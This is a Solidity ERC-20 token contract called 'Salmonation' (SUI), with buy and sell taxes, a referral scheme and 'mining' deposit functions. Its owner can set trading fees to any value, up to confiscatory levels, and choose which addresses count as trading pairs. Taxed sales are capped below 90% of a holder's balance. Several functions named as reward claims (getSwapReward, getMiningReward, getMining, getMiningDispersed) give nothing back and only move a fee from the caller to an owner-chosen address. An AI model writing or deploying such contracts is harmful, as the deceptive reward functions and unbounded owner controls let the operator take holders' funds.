// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Token {
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }

    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Salmonation is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) public _addrMiningAmount;
    mapping (address => uint256) public _addrMiningDispersedAmount;
    
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100 * 10**6 * 10**_decimals;
    uint256 private _tFeeTotal;
    
    uint256 private _taxFeeOnTransfer = 9;  
    uint256 private _taxFeeOnBuy = 6;  
    uint256 private _taxFeeOnSell = 6; 
    uint256 private _taxFee;
    uint256 public _getRewardFee;
    uint256 public _addLiquidityBuyRate;
    uint256 public _addLiquiditySellRate;

    
    string private constant _name = "Salmonation";
    string private constant _symbol = "SUI";
    
    

    address payable private _reserverAddressBuy;
    address payable private _reserverAddressSell;
    address payable private _expandFeeAddress;
    address payable public _addLiquidityAddr;
    address public _rewardFeeAddress;

    IUniswapV2Router02 public uniswapV2Router;
    mapping (address => bool) private uniswapV2Pair;
    
    bool private inSwap = false;
    bool private swapEnabled = true;

    uint private _swapBuySell;
    
    
    
    constructor (address routerAddress) {
        _rOwned[_msgSender()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(routerAddress);
        uniswapV2Router = _uniswapV2Router;
        //uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());


        emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        //require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _taxFee = 0; 
        if (from != owner() && to != owner()) {
            if (from != _addLiquidityAddr && to != _addLiquidityAddr) {
         
                _swapBuySell = 2;

                if(uniswapV2Pair[from]==true && to != address(uniswapV2Router)) {
                    _taxFee = _taxFeeOnBuy; 
                    _swapBuySell = 1;
                }
        
                if (uniswapV2Pair[to]==true && from != address(uniswapV2Router)) {
                    _taxFee = _taxFeeOnSell; 
                    _swapBuySell = 0;
                }
            }
            
        }

        _tokenTransfer(from,to,amount);
    }


    
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        _transferStandard(sender, recipient, amount);
    }


    function setNewReserverAddressBuy(address payable addr) public onlyOwner() {	
        _reserverAddressBuy = addr;
    }

    

    function getReserverAddressBuy() public view returns (address) {	
        return _reserverAddressBuy;
    }

    function setNewReserverAddressSell(address payable addr) public onlyOwner() {	
        _reserverAddressSell = addr;
    }

    function getReserverAddressSell() public view returns (address) {	
        return _reserverAddressSell;
    }

    function setNewExpandFeeAddress(address payable addr) public onlyOwner() {	
        _expandFeeAddress = addr;
    }

    function getExpandFeeAddress() public view returns (address) {	
        return _expandFeeAddress;
    }

    function setNewRouterAddress(address payable router) public onlyOwner() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;
    }

    function setAddLiquidityAddr(address payable addr) public onlyOwner() {
        _addLiquidityAddr = addr;
    }
    
    function setAddLiquidityBuyRate(uint256 amount) public onlyOwner() {
        _addLiquidityBuyRate = amount;
    }

    function setAddLiquiditySellRate(uint256 amount) public onlyOwner() {
        _addLiquiditySellRate = amount;
    }

    function setUniswapV2Pair(address payable addr) public onlyOwner() {
        uniswapV2Pair[addr] = true;
    }

    function deleteUniswapV2Pair(address payable addr) public onlyOwner() {
        uniswapV2Pair[addr]=false;
    }
    
    function getUniswapV2Pair(address addr) public view returns (bool) {	
        return uniswapV2Pair[addr];
    }

    

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ( uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount); 
        
        if (tFee>0 && _swapBuySell==0){
            require(tAmount<balanceOf(sender)*9/10);    
        }
        _rOwned[sender] = _rOwned[sender].sub(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(tTransferAmount);
        emit Transfer(sender, recipient, tTransferAmount);
        if (tFee>0){
            if (_swapBuySell==1){
                if (_addLiquidityBuyRate>0){
                    _rOwned[_reserverAddressBuy] = _rOwned[_reserverAddressBuy].add(tFee.mul(100-_addLiquidityBuyRate).div(100));
                    emit Transfer(sender, _reserverAddressBuy, tFee.mul(100-_addLiquidityBuyRate).div(100));
                    _rOwned[_addLiquidityAddr] = _rOwned[_addLiquidityAddr].add(tFee.mul(_addLiquidityBuyRate).div(100));
                    emit Transfer(sender, _addLiquidityAddr, tFee.mul(_addLiquidityBuyRate).div(100));
                }else{
                    _rOwned[_reserverAddressBuy] = _rOwned[_reserverAddressBuy].add(tFee);
                    emit Transfer(sender, _reserverAddressBuy, tFee);
                }
                
            }
            if (_swapBuySell==0){
                if (_addLiquiditySellRate>0){
                    _rOwned[_reserverAddressSell] = _rOwned[_reserverAddressSell].add(tFee.mul(100-_addLiquiditySellRate).div(100));
                    emit Transfer(sender, _reserverAddressSell, tFee.mul(100-_addLiquiditySellRate).div(100));
                    _rOwned[_addLiquidityAddr] = _rOwned[_addLiquidityAddr].add(tFee.mul(_addLiquiditySellRate).div(100));
                    emit Transfer(sender, _addLiquidityAddr, tFee.mul(_addLiquiditySellRate).div(100));
                }else{
                    _rOwned[_reserverAddressSell] = _rOwned[_reserverAddressSell].add(tFee);
                    emit Transfer(sender, _reserverAddressSell, tFee);
                }
            }            
        } 
        
    }



    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount, _taxFee);
        return (tTransferAmount, tFee);
    }

    function _getTValues(uint256 tAmount, uint256 taxFee) private pure returns (uint256, uint256) {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }

    
    function setFeeBuy(uint256 taxFeeOnBuy) public onlyOwner {
        _taxFeeOnBuy = taxFeeOnBuy;
    }

    function getFeeBuy() public view returns(uint256) {
        return _taxFeeOnBuy;
    }

    function setFeeSell(uint256 taxFeeOnSell) public onlyOwner {
        _taxFeeOnSell = taxFeeOnSell;
    }

    function getFeeSell() public view returns(uint256) {
        return _taxFeeOnSell;
    }



    mapping (address => address) private _expand;
    uint256 private _expandFee = 20 * 10**_decimals;
    
    function getExpandFee() public view returns (uint256) {
        return  _expandFee;
    }

    function setExpandFee(uint256 fee) public onlyOwner{
        require(_msgSender() == owner());
        _expandFee = fee;
    }

    function setExpandAddress(address addr) public {
        require(_expand[addr] == 0x0000000000000000000000000000000000000000,"The invitee already has a superior!");
        if (_msgSender() != owner()){
            require(_expand[_msgSender()] != 0x0000000000000000000000000000000000000000,"Superior error!");
        }
        require(balanceOf(_msgSender())>=_expandFee,"Insufficient balance");
        _transfer(_msgSender(), _expandFeeAddress, _expandFee);
        _expand[addr] = _msgSender();  

    }

    function setExpandAddressNull(address addr) public onlyOwner{
        require(_msgSender() == owner());
        _expand[addr] = 0x0000000000000000000000000000000000000000;  
    }

    function expand(address addr) public view returns (address) {
        return _expand[addr];
    }
    function getSwapReward() public {
        _transfer(_msgSender(), _rewardFeeAddress, _getRewardFee);
    }

    function setRewardFeeAddress(address addr) public onlyOwner{
        _rewardFeeAddress = addr;
    }
    function setGetRewardFee(uint256 amount) public onlyOwner{
        _getRewardFee = amount; 
    }

    function mining(uint256 amount) public {
        require(amount>0);
        require(balanceOf(_msgSender())>=amount,"Insufficient balance");
        _transfer(_msgSender(), address(this), amount);
        _addrMiningAmount[_msgSender()] = _addrMiningAmount[_msgSender()].add(amount);
    }

    function drawMining(uint256 amount) public {
        require(amount>0);
        require(_addrMiningAmount[_msgSender()]-amount>=0);

        _addrMiningAmount[_msgSender()] = _addrMiningAmount[_msgSender()].sub(amount);
        _transfer(address(this),_msgSender(), amount);
    }

    function getMiningReward() public {
        _transfer(_msgSender(), _rewardFeeAddress, _getRewardFee);
    }
    function getMining() public {
        _transfer(_msgSender(), _rewardFeeAddress, _getRewardFee);
    }


    function miningDispersed(uint256 amount) public {
        require(amount>0);
        require(balanceOf(_msgSender())>=amount,"Insufficient balance");
        _transfer(_msgSender(), address(this), amount);
        _addrMiningDispersedAmount[_msgSender()] = _addrMiningDispersedAmount[_msgSender()].add(amount);
    }

    function drawMiningDispersed(uint256 amount) public {
        require(amount>0);
        require(_addrMiningDispersedAmount[_msgSender()]-amount>=0);

        _addrMiningDispersedAmount[_msgSender()] = _addrMiningDispersedAmount[_msgSender()].sub(amount);
        _transfer(address(this),_msgSender(), amount);
        
    }

    function getMiningDispersed() public {
        _transfer(_msgSender(), _rewardFeeAddress, _getRewardFee);
    }
}